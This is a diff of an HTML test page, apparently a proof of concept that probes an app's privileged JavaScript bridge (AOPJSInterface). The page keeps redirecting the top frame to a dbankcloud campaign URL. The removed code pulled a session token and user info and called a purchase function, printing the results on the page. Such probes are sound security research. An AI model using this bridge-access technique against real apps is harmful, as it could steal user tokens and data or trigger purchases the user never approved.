@@ -3,31 +3,19 @@
 		<body style="word-wrap:break-word;">
 		<script>	
 		    setInterval(gotowhite, 5);
-    		setTimeout(getUserInfo, 500);
+    		setTimeout(getUserInfo, 1000);
 
     function gotowhite() {
-        top.location.href = "https://url.cloud.huawei.com";
+        top.location.href = "https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/bad5fd85661b4ce697cc0520211a44b2/index.html?share=true&appsafearguments=true&viewsId=0";
     }
 			
-   async function getUserInfo() {
+    function getUserInfo() {
             var newDiv = document.createElement('div');
             if(window.AOPJSInterface){
-                try {
-                  
-                    let Params =  window.AOPJSInterface.getParams();
-                    let SpToken = await window.AOPJSInterface.getSpToken();	
-                   	console.log('getParam: ' + Params)
-                    let UserInfo = await window.AOPJSInterface.getUserInfo();	
-                    let productinfo = await window.AOPJSInterface.purchaseMember();
-
-                    let result = '';
-                    result += 'Params:' + Params;
-                    result += '\\n SpToken:' + JSON.stringify(SpToken);
-                    result += '\\n UserInfo:' + JSON.stringify(UserInfo);
-                    result += '\\n productinfo:' + JSON.stringify(productinfo);
-                    console.log('ccc result: ' + result)
-					newDiv.innerText  = result;
-					
+                try {                  
+                    let Params =  window.AOPJSInterface.getParams();            
+                    console.log('ccc result: ' + Params)
+					newDiv.innerText  = Params;					
                 } catch (error) {
                     newDiv.innerText = 'Error: ' + error.message;
                 }
